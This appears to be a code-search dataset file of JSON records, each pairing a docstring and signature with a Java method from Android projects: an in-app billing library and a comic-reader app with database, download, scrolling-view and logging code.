{"docstring": "/**\n * Returns true if the specified item has been registered as purchased in\n * local memory, false otherwise. Also note that the item might have been\n * purchased in another installation, but not yet registered in this one.\n * \n * @param context\n * @param itemId\n *            item id.\n * @return true if the specified item is purchased, false otherwise.\n */\n", "func_signal": "public static boolean isPurchased(Context context, String itemId)", "code": "{\n\tfinal byte[] salt = getSalt();\n\titemId = salt != null ? Security.obfuscate(context, salt, itemId) : itemId;\n\treturn TransactionManager.isPurchased(context, itemId);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after the response to a\n * {@link net.robotmedia.billing.request.CheckSubscriptionSupported} request\n * is received.\n * \n * @param supported\n */\n", "func_signal": "protected static void onSubscriptionChecked(boolean supported)", "code": "{\n\tsubscriptionStatus = supported ? BillingStatus.SUPPORTED : BillingStatus.UNSUPPORTED;\n\tif (subscriptionStatus == BillingStatus.SUPPORTED) { // Save us the\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// billing check\n\t\tbillingStatus = BillingStatus.SUPPORTED;\n\t}\n\tfor (IBillingObserver o : observers) {\n\t\to.onSubscriptionChecked(supported);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Lists all transactions stored locally, including cancellations and\n * refunds.\n * \n * @param context\n * @return list of transactions.\n */\n", "func_signal": "public static List<Transaction> getTransactions(Context context)", "code": "{\n\tList<Transaction> transactions = TransactionManager.getTransactions(context);\n\tunobfuscate(context, transactions);\n\treturn transactions;\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after the response to a\n * {@link net.robotmedia.billing.request.CheckBillingSupported} request is\n * received.\n * \n * @param supported\n */\n", "func_signal": "protected static void onBillingChecked(boolean supported)", "code": "{\n\tbillingStatus = supported ? BillingStatus.SUPPORTED : BillingStatus.UNSUPPORTED;\n\tif (billingStatus == BillingStatus.UNSUPPORTED) { // Save us the\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t// subscription\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t// check\n\t\tsubscriptionStatus = BillingStatus.UNSUPPORTED;\n\t}\n\tfor (IBillingObserver o : observers) {\n\t\to.onBillingChecked(supported);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after the response to a\n * {@link net.robotmedia.billing.request.GetPurchaseInformation} request is\n * received. Registers all transactions in local memory and confirms those\n * who can be confirmed automatically.\n * \n * @param context\n * @param signedData\n *            signed JSON data received from the Market Billing service.\n * @param signature\n *            data signature.\n */\n", "func_signal": "protected static void onPurchaseStateChanged(Context context, String signedData, String signature)", "code": "{\n\tdebug(\"Purchase state changed\");\n\t\n\tif (TextUtils.isEmpty(signedData)) {\n\t\tLog.w(LOG_TAG, \"Signed data is empty\");\n\t\treturn;\n\t} else {\n\t\tdebug(signedData);\n\t}\n\n\tif (!debug) {\n\t\tif (TextUtils.isEmpty(signature)) {\n\t\t\tLog.w(LOG_TAG, \"Empty signature requires debug mode\");\n\t\t\treturn;\n\t\t}\n\t\tfinal ISignatureValidator validator = BillingController.validator != null ? BillingController.validator\n\t\t\t\t: new DefaultSignatureValidator(BillingController.configuration);\n\t\tif (!validator.validate(signedData, signature)) {\n\t\t\tLog.w(LOG_TAG, \"Signature does not match data.\");\n\t\t\treturn;\n\t\t}\n\t}\n\n\tList<Transaction> purchases;\n\ttry {\n\t\tJSONObject jObject = new JSONObject(signedData);\n\t\tif (!verifyNonce(jObject)) {\n\t\t\tLog.w(LOG_TAG, \"Invalid nonce\");\n\t\t\treturn;\n\t\t}\n\t\tpurchases = parsePurchases(jObject);\n\t} catch (JSONException e) {\n\t\tLog.e(LOG_TAG, \"JSON exception: \", e);\n\t\treturn;\n\t}\n\n\tArrayList<String> confirmations = new ArrayList<String>();\n\tfor (Transaction p : purchases) {\n\t\tif (p.notificationId != null && automaticConfirmations.contains(p.productId)) {\n\t\t\tconfirmations.add(p.notificationId);\n\t\t} else {\n\t\t\t// TODO: Discriminate between purchases, cancellations and\n\t\t\t// refunds.\n\t\t\taddManualConfirmation(p.productId, p.notificationId);\n\t\t}\n\t\tstoreTransaction(context, p);\n\t\tnotifyPurchaseStateChange(p.productId, p.purchaseState);\n\t}\n\tif (!confirmations.isEmpty()) {\n\t\tfinal String[] notifyIds = confirmations.toArray(new String[confirmations.size()]);\n\t\tconfirmNotifications(context, notifyIds);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after a {@link net.robotmedia.billing.BillingRequest} is sent.\n * \n * @param requestId\n *            the id the request.\n * @param request\n *            the billing request.\n */\n", "func_signal": "protected static void onRequestSent(long requestId, BillingRequest request)", "code": "{\n\tdebug(\"Request \" + requestId + \" of type \" + request.getRequestType() + \" sent\");\n\n\tif (request.isSuccess()) {\n\t\tpendingRequests.put(requestId, request);\n\t} else if (request.hasNonce()) {\n\t\tSecurity.removeNonce(request.getNonce());\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Starts the specified purchase intent with the specified activity.\n * \n * @param activity\n * @param purchaseIntent\n *            purchase intent.\n * @param intent\n */\n", "func_signal": "public static void startPurchaseIntent(Activity activity, PendingIntent purchaseIntent, Intent intent)", "code": "{\n\tif (Compatibility.isStartIntentSenderSupported()) {\n\t\t// This is on Android 2.0 and beyond. The in-app buy page activity\n\t\t// must be on the activity stack of the application.\n\t\tCompatibility.startIntentSender(activity, purchaseIntent.getIntentSender(), intent);\n\t} else {\n\t\t// This is on Android version 1.6. The in-app buy page activity must\n\t\t// be on its own separate activity stack instead of on the activity\n\t\t// stack of the application.\n\t\ttry {\n\t\t\tpurchaseIntent.send(activity, 0 /* code */, intent);\n\t\t} catch (CanceledException e) {\n\t\t\tLog.e(LOG_TAG, \"Error starting purchase intent\", e);\n\t\t}\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Requests to restore all transactions.\n * \n * @param context\n */\n", "func_signal": "public static void restoreTransactions(Context context)", "code": "{\n\tfinal long nonce = Security.generateNonce();\n\tBillingService.restoreTransations(context, nonce);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Requests the purchase of the specified subscription item with optional\n * automatic confirmation.\n * \n * @param context\n * @param itemId\n *            id of the item to be purchased.\n * @param confirm\n *            if true, the transaction will be confirmed automatically. If\n *            false, the transaction will have to be confirmed with a call\n *            to {@link #confirmNotifications(Context, String)}.\n * @param developerPayload\n *            a developer-specified string that contains supplemental\n *            information about the order.\n * @see IBillingObserver#onPurchaseIntent(String, PendingIntent)\n */\n", "func_signal": "public static void requestSubscription(Context context, String itemId, boolean confirm, String developerPayload)", "code": "{\n\tif (confirm) {\n\t\tautomaticConfirmations.add(itemId);\n\t}\n\tBillingService.requestSubscription(context, itemId, developerPayload);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Called after the response to a\n * {@link net.robotmedia.billing.request.RequestPurchase} request is\n * received.\n * \n * @param itemId\n *            id of the item whose purchase was requested.\n * @param purchaseIntent\n *            intent to purchase the item.\n */\n", "func_signal": "protected static void onPurchaseIntent(String itemId, PendingIntent purchaseIntent)", "code": "{\n\tfor (IBillingObserver o : observers) {\n\t\to.onPurchaseIntent(itemId, purchaseIntent);\n\t}\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Adds the specified notification to the set of manual confirmations of the\n * specified item.\n * \n * @param itemId\n *            id of the item.\n * @param notificationId\n *            id of the notification.\n */\n", "func_signal": "private static final void addManualConfirmation(String itemId, String notificationId)", "code": "{\n\tSet<String> notifications = manualConfirmations.get(itemId);\n\tif (notifications == null) {\n\t\tnotifications = new HashSet<String>();\n\t\tmanualConfirmations.put(itemId, notifications);\n\t}\n\tnotifications.add(notificationId);\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "/**\n * Parse all purchases from the JSON data received from the Market Billing\n * service.\n * \n * @param data\n *            JSON data received from the Market Billing service.\n * @return list of purchases.\n * @throws JSONException\n *             if the data couldn't be properly parsed.\n */\n", "func_signal": "private static List<Transaction> parsePurchases(JSONObject data) throws JSONException", "code": "{\n\tArrayList<Transaction> purchases = new ArrayList<Transaction>();\n\tJSONArray orders = data.optJSONArray(JSON_ORDERS);\n\tint numTransactions = 0;\n\tif (orders != null) {\n\t\tnumTransactions = orders.length();\n\t}\n\tfor (int i = 0; i < numTransactions; i++) {\n\t\tJSONObject jElement = orders.getJSONObject(i);\n\t\tTransaction p = Transaction.parse(jElement);\n\t\tpurchases.add(p);\n\t}\n\treturn purchases;\n}", "path": "AndroidBillingLibrary\\src\\net\\robotmedia\\billing\\BillingController.java", "repo_name": "robotmedia/AndroidBillingLibrary", "stars": 533, "license": "None", "language": "java", "size": 756}
{"docstring": "//\u8f93\u51fa\u65e5\u5fd7\n", "func_signal": "public void setDebug()", "code": "{\n    QueryBuilder.LOG_SQL = true;\n    QueryBuilder.LOG_VALUES = true;\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\db\\manager\\DaoManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "//   \u6570\u636e\u5904\u7406\n", "func_signal": "public DaoSession getDaoSession()", "code": "{\n    if (daoSession == null) {\n        if (daoMaster == null) {\n            daoMaster = getDaoMaster();\n        }\n        daoSession = daoMaster.newSession();\n    }\n    return daoSession;\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\db\\manager\\DaoManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "//\u5173\u95edsession\n", "func_signal": "public void closeSession()", "code": "{\n    if (daoSession != null) {\n        daoSession.clear();\n        daoSession = null;\n    }\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\db\\manager\\DaoManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "// \u662f\u5426\u9700\u8981\u79fb\u52a8\u5e03\u5c40  \n", "func_signal": "public boolean isNeedMove(float nowY)", "code": "{\n    int scrollY = getScrollY();\n    return scrollY == 0 && nowY > mTopView.getMeasuredHeight() || scrollY == height;\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\DetailScrollView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u505c\u6b62\u4e0b\u8f7d\n */\n", "func_signal": "public void stopDown(DownInfo info)", "code": "{\n    if (info == null) return;\n    info.setState(DownState.STOP);\n    info.getListener().onStop();\n    if (subMap.containsKey(info.getUrl())) {\n        ProgressDownSubscriber subscriber = subMap.get(info.getUrl());\n        subscriber.dispose();//\u53d6\u6d88\u7f51\u7edc\u8bf7\u6c42\n        subMap.remove(info.getUrl());\n    }\n    /*\u4fdd\u5b58\u6570\u636e\u5e93\u4fe1\u606f\u548c\u672c\u5730\u6587\u4ef6*/\n    mHelper.insert(info);\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u5199\u5165\u6587\u4ef6\n *\n * @param file\n * @param info\n * @throws IOException\n */\n", "func_signal": "public void writeCaches(ResponseBody responseBody, File file, DownInfo info)", "code": "{\n    try {\n        RandomAccessFile randomAccessFile = null;\n        FileChannel channelOut = null;\n        InputStream inputStream = null;\n        try {\n            if (!file.getParentFile().exists())\n                file.getParentFile().mkdirs();\n            long allLength = 0 == info.getCountLength() ? responseBody.contentLength() : info.getReadLength() + responseBody\n                    .contentLength();\n\n            inputStream = responseBody.byteStream();\n            randomAccessFile = new RandomAccessFile(file, \"rwd\");\n            channelOut = randomAccessFile.getChannel();\n            MappedByteBuffer mappedBuffer = channelOut.map(FileChannel.MapMode.READ_WRITE,\n                    info.getReadLength(), allLength - info.getReadLength());\n            byte[] buffer = new byte[1024 * 4];\n            int len;\n            while ((len = inputStream.read(buffer)) != -1) {\n                mappedBuffer.put(buffer, 0, len);\n            }\n        } catch (IOException e) {\n            throw new ApiException(e.getMessage());\n        } finally {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (channelOut != null) {\n                channelOut.close();\n            }\n            if (randomAccessFile != null) {\n                randomAccessFile.close();\n            }\n        }\n    } catch (IOException e) {\n        throw new ApiException(e.getMessage());\n    }\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u68c0\u67e5\u65b0\u7248\u672c\n */\n", "func_signal": "private void CheckVersion()", "code": "{\n    PgyUpdateManager.register(this, new UpdateManagerListener() {\n        @Override\n        public void onNoUpdateAvailable() {\n            LogUtil.d(\"\u6ca1\u6709\u53d1\u73b0\u65b0\u7248\u672c\");\n        }\n\n        @Override\n        public void onUpdateAvailable(String result) {\n            final AppBean appBean = getAppBeanFromString(result);\n            LogUtil.d(appBean.toString());\n            final CustomDialog dialog = new CustomDialog(MainActivity.this,\"\u81ea\u52a8\u66f4\u65b0\",\"\u53d1\u73b0\u65b0\u7248\u672c:v\"+appBean.getVersionName()+\",\u662f\u5426\u66f4\u65b0?\");\n            dialog.setListener(new CustomDialog.onClickListener() {\n                @Override\n                public void OnClickConfirm() {\n                    startDownloadTask(\n                            MainActivity.this,\n                            appBean.getDownloadURL());\n                    dialog.dismiss();\n                }\n\n                @Override\n                public void OnClickCancel() {\n                    dialog.dismiss();\n                }\n            });\n            dialog.show();\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\activity\\MainActivity.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "//\u83b7\u53d6\u5230ScrollView\u5185\u90e8\u7684\u5b50View,\u5e76\u8d4b\u503c\u7ed9inner\n", "func_signal": "protected void onFinishInflate()", "code": "{\n    if (getChildCount() > 0) {\n        inner = (RelativeLayout) getChildAt(0);\n    }\n    mMoveView = (RelativeLayout) inner.getChildAt(0);\n    mTopView = inner.getChildAt(1);\n    mLoadingTop = mMoveView.getChildAt(0);\n    mDetailView = mMoveView.getChildAt(1);\n    //mListView = mMoveView.getChildAt(2);\n    mLoadingBottom = mMoveView.getChildAt(3);\n    setOverScrollMode(OVER_SCROLL_NEVER);//\u53d6\u6d885.0\u6548\u679c\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\DetailScrollView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u6682\u505c\u4e0b\u8f7d\n *\n * @param info\n */\n", "func_signal": "public void pause(DownInfo info)", "code": "{\n    if (info == null) return;\n    info.setState(DownState.PAUSE);\n    LogUtil.v(\"\u6682\u505c\u4e0b\u8f7d\");\n    info.getListener().onPuase();\n    if (subMap.containsKey(info.getUrl())) {\n        ProgressDownSubscriber subscriber = subMap.get(info.getUrl());\n        subscriber.dispose();\n        subMap.remove(info.getUrl());\n    }\n    /*\u8fd9\u91cc\u9700\u8981\u8bb2info\u4fe1\u606f\u5199\u5165\u5230\u6570\u636e\u4e2d\uff0c\u53ef\u81ea\u7531\u6269\u5c55\uff0c\u7528\u81ea\u5df1\u9879\u76ee\u7684\u6570\u636e\u5e93*/\n    mHelper.update(info);\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "//\u5224\u65ad\u662f\u5426\u5b58\u5728\u6570\u636e\u5e93\uff0c\u6ca1\u6709\u5c31\u521b\u5efa\n", "func_signal": "public DaoMaster getDaoMaster()", "code": "{\n    if (daoMaster == null) {\n        helper = new DaoMaster.DevOpenHelper(mContext, Constants.DB_NAME, null);\n        daoMaster = new DaoMaster(helper.getWritableDb());\n    }\n    return daoMaster;\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\db\\manager\\DaoManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u79fb\u9664\u4e0b\u8f7d\u6570\u636e\n *\n * @param info\n */\n", "func_signal": "public void remove(DownInfo info)", "code": "{\n    subMap.remove(info.getUrl());\n    downInfos.remove(info);\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u5f00\u59cb\u4e0b\u8f7d\n */\n", "func_signal": "public void startDown(final DownInfo info,Context context)", "code": "{\n    /*\u6b63\u5728\u4e0b\u8f7d\u4e0d\u5904\u7406*/\n    if (info == null || subMap.get(info.getUrl()) != null) {\n        subMap.get(info.getUrl()).setDownInfo(info);\n        return;\n    }\n    /*\u6dfb\u52a0\u56de\u8c03\u5904\u7406\u7c7b*/\n    ProgressDownSubscriber subscriber = new ProgressDownSubscriber(info,context);\n    /*\u8bb0\u5f55\u56de\u8c03sub*/\n    subMap.put(info.getUrl(), subscriber);\n    /*\u83b7\u53d6service\uff0c\u591a\u6b21\u8bf7\u6c42\u516c\u7528\u4e00\u4e2asercie*/\n    ComicService httpService;\n    if (downInfos.contains(info)) {\n        httpService = info.getService();\n    } else {\n        DownloadInterceptor interceptor = new DownloadInterceptor(subscriber);\n        OkHttpClient.Builder builder = new OkHttpClient.Builder();\n        //\u624b\u52a8\u521b\u5efa\u4e00\u4e2aOkHttpClient\u5e76\u8bbe\u7f6e\u8d85\u65f6\u65f6\u95f4\n        builder.connectTimeout(info.getConnectonTime(), TimeUnit.SECONDS);\n        builder.addInterceptor(interceptor);\n\n        Retrofit retrofit = new Retrofit.Builder()\n                .client(builder.build())\n                .addConverterFactory(GsonConverterFactory.create())\n                .addCallAdapterFactory(RxJava2CallAdapterFactory.create())\n                .baseUrl(getBasUrl(info.getUrl()))\n                .build();\n        httpService = retrofit.create(ComicService.class);\n        info.setService(httpService);\n        downInfos.add(info);\n    }\n    /*\u5f97\u5230rx\u5bf9\u8c61-\u4e0a\u4e00\u6b21\u4e0b\u8f09\u7684\u4f4d\u7f6e\u958b\u59cb\u4e0b\u8f09*/\n    httpService.download(\"bytes=\" + info.getReadLength() + \"-\", info.getUrl())\n            /*\u6307\u5b9a\u7ebf\u7a0b*/\n            .subscribeOn(Schedulers.io())\n            .unsubscribeOn(Schedulers.io())\n               /*\u5931\u8d25\u540e\u7684retry\u914d\u7f6e*/\n            //.retryWhen(new RetryWhenNetworkException())\n            /*\u8bfb\u53d6\u4e0b\u8f7d\u5199\u5165\u6587\u4ef6*/\n            .map(new Function<ResponseBody, Object>() {\n                @Override\n                public Object apply(@NonNull ResponseBody responseBody) throws Exception {\n                    writeCaches(responseBody, new File(info.getSavePath()), info);\n                    return info;\n                }\n            })\n            /*\u56de\u8c03\u7ebf\u7a0b*/\n            .observeOn(AndroidSchedulers.mainThread())\n            /*\u6570\u636e\u56de\u8c03*/\n            .subscribe(subscriber);\n\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u505c\u6b62\u5168\u90e8\u4e0b\u8f7d\n */\n", "func_signal": "public void stopAllDown()", "code": "{\n    for (DownInfo downInfo : downInfos) {\n        stopDown(downInfo);\n    }\n    subMap.clear();\n    downInfos.clear();\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "// public method\n", "func_signal": "public void setEnableScale(boolean enable)", "code": "{\n    if (isEnableScale == enable) {\n        return;\n    }\n    this.isEnableScale = enable;\n    // \u7981\u7528\u4e86 \u6062\u590d\u6bd4\u4f8b1\n    if (!isEnableScale && mScaleFactor != 1) {\n        zoom(mScaleFactor, 1);\n    }\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\ZoomRecyclerView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u8bfb\u53d6baseurl\n * @param url\n * @return\n */\n", "func_signal": "public static String getBasUrl(String url)", "code": "{\n    String head = \"\";\n    int index = url.indexOf(\"://\");\n    if (index != -1) {\n        head = url.substring(0, index + 3);\n        url = url.substring(index + 3);\n    }\n    index = url.indexOf(\"/\");\n    if (index != -1) {\n        url = url.substring(0, index + 1);\n    }\n    return head + url;\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u5f3a\u5236\u8bbe\u7f6e\u5185\u5c42VIEW\u7684\u9ad8\u5ea6\uff0c\u9632\u6b62\u5237\u65b0\u8f83\u6162\u5bfc\u81f4\u663e\u793a\u4e0d\u5168\n */\n", "func_signal": "public void setInnerHeight()", "code": "{\n    if(inner!=null){\n        int height = mMoveView.getHeight()+DisplayUtil.dip2px(getContext(),140);\n        inner.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,height));\n    }\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\DetailScrollView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "//\u5f53scale \u5927\u4e8e 1 \u65f6\u4fee\u6b63action move\u7684\u4f4d\u7f6e\n", "func_signal": "private void correctTranslateXY()", "code": "{\n    float[] correctXY = correctTranslateXY(mTranX, mTranY);\n    mTranX = correctXY[0];\n    mTranY = correctXY[1];\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\ZoomRecyclerView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u8bbe\u7f6e\u5237\u65b0\u72b6\u6001\n * @param isRefresh\n */\n", "func_signal": "public void setRefreshing(boolean isRefresh)", "code": "{\n    if(this.isRefresh!=isRefresh){\n        this.isRefresh = isRefresh;\n        if(isRefresh == false){\n            animation();\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\DetailScrollView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * \u6682\u505c\u5168\u90e8\u4e0b\u8f7d\n */\n", "func_signal": "public void pauseAll()", "code": "{\n    for (DownInfo downInfo : downInfos) {\n        pause(downInfo);\n    }\n    subMap.clear();\n    downInfos.clear();\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\net\\download\\HttpDownManager.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "// \u5f00\u542f\u52a8\u753b\u79fb\u52a8  \n", "func_signal": "public void animation()", "code": "{\n    // \u5f00\u542f\u79fb\u52a8\u52a8\u753b  \n    TranslateAnimation ta = new TranslateAnimation(0, 0, mMoveView.getTop()-DisplayUtil.dip2px(getContext(),140), normal.top-DisplayUtil.dip2px(getContext(),140));\n   // Log.d(\"zhhr112233\", \"inner.getTop()=\" + inner.getTop() + \",normal.top=\" + normal.top);\n    Interpolator in = new DecelerateInterpolator();\n    ta.setInterpolator(in);\n    ta.setDuration(300);\n    Log.d(\"DetailScrollView\", \"animation\"+\"getScrollY=\"+getScrollY()+\"height=\"+height);\n    if(getScrollY() < height){\n        Log.d(\"DetailScrollView\", \"isFinished()\"+\"getScrollY=\"+getScrollY()+\"height=\"+height);\n        scalelistener.isFinished();\n    }\n    mMoveView.startAnimation(ta);\n    // \u8bbe\u7f6e\u56de\u5230\u6b63\u5e38\u7684\u5e03\u5c40\u4f4d\u7f6e  \n    mMoveView.layout(normal.left, normal.top, normal.right, normal.bottom);\n    normal.setEmpty();\n}", "path": "app\\src\\main\\java\\com\\android\\zhhr\\ui\\custom\\DetailScrollView.java", "repo_name": "zhhr1122/z_comic_new", "stars": 887, "license": "None", "language": "java", "size": 19799}
{"docstring": "/**\n * Only support for Collection\u3001map\u3001array\n *\n * @see \"https://github.com/pengwei1024/LogUtils\"\n */\n", "func_signal": "@Override\npublic void object(Object object)", "code": "{\n  if (object != null) {\n    final String simpleName = object.getClass().getSimpleName();\n    if (object.getClass().isArray()) {\n      String msg = \"Temporarily not support more than two dimensional Array!\";\n      int dim = ArrayUtil.getArrayDimension(object);\n      switch (dim) {\n        case 1:\n          Pair pair = ArrayUtil.arrayToString(object);\n          msg = simpleName.replace(\"[]\", \"[\" + pair.first + \"] {\\n\");\n          msg += pair.second + \"\\n\";\n          break;\n        case 2:\n          Pair pair1 = ArrayUtil.arrayToObject(object);\n          Pair pair2 = (Pair) pair1.first;\n          msg = simpleName.replace(\"[][]\", \"[\" + pair2.first + \"][\" + pair2.second + \"] {\\n\");\n          msg += pair1.second + \"\\n\";\n          break;\n        default:\n          break;\n      }\n      d(msg + \"}\");\n    } else if (object instanceof Collection) {\n      Collection collection = (Collection) object;\n      String msg = \"%s size = %d [\\n\";\n      msg = String.format(msg, simpleName, collection.size());\n      if (!collection.isEmpty()) {\n        Iterator iterator = collection.iterator();\n        int flag = 0;\n        while (iterator.hasNext()) {\n          String itemString = \"[%d]:%s%s\";\n          Object item = iterator.next();\n          msg += String.format(itemString, flag, SystemUtil.objectToString(item),\n                  flag++ < collection.size() - 1 ? \",\\n\" : \"\\n\");\n        }\n      }\n      d(msg + \"\\n]\");\n    } else if (object instanceof Map) {\n      String msg = simpleName + \" {\\n\";\n      Map map = (Map) object;\n      Set keys = map.keySet();\n      for (Object key : keys) {\n        String itemString = \"[%s -> %s]\\n\";\n        Object value = map.get(key);\n        msg += String.format(itemString, SystemUtil.objectToString(key),\n                SystemUtil.objectToString(value));\n      }\n      d(msg + \"}\");\n    } else {\n      d(SystemUtil.objectToString(object));\n    }\n  } else {\n    d(null);\n  }\n}\n\n/**\n * This method is synchronized in order to avoid messy of logs' order.\n */\nprivate synchronized void log(int logType, String msg, Object... args) {\n  if (settings.getLogLevel() == LogLevel.NONE) {\n    return;\n  }\n  String tag = getTag();\n  String message = createMessage(msg, args);\n  int methodCount = getMethodCount();\n\n  logTopBorder(logType, tag);\n  logHeaderContent(logType, tag, methodCount);\n\n  //get bytes of message with system's default charset (which is UTF-8 for Android)\n  byte[] bytes = message.getBytes();\n  int length = bytes.length;\n  if (length <= CHUNK_SIZE) {\n    if (methodCount > 0) {\n      logDivider(logType, tag);\n    }\n    logContent(logType, tag, message);\n    logBottomBorder(logType, tag);\n    return;\n  }\n  if (methodCount > 0) {\n    logDivider(logType, tag);\n  }\n  for (int i = 0; i < length; i += CHUNK_SIZE) {\n    int count = Math.min(length - i, CHUNK_SIZE);\n    //create a new String with system's default charset (which is UTF-8 for Android)\n    logContent(logType, tag, new String(bytes, i, count));\n  }\n  logBottomBorder(logType, tag);\n}\n\nprivate void logTopBorder(int logType, String tag) {\n  logChunk(logType, tag, TOP_BORDER);\n}\n\nprivate void logHeaderContent(int logType, String tag, int methodCount) {\n  StackTraceElement[] trace = Thread.currentThread().getStackTrace();\n  if (settings.isShowThreadInfo()) {\n    logChunk(logType, tag, HORIZONTAL_DOUBLE_LINE + \" Thread: \" + Thread.currentThread().getName());\n    logDivider(logType, tag);\n  }\n  String level = \"\";\n\n  int stackOffset = getStackOffset(trace) + settings.getMethodOffset();\n\n  //corresponding method count with the current stack may exceeds the stack trace. Trims the count\n  if (methodCount + stackOffset > trace.length) {\n    methodCount = trace.length - stackOffset - 1;\n  }\n\n  for (int i = methodCount; i > 0; i--) {\n    int stackIndex = i + stackOffset;\n    if (stackIndex >= trace.length) {\n      continue;\n    }\n    level += \"   \";\n    logChunk(logType, tag, \"\u2551 \" \n            + level + getSimpleClassName(trace[stackIndex].getClassName()) \n            + \".\" + trace[stackIndex].getMethodName() + 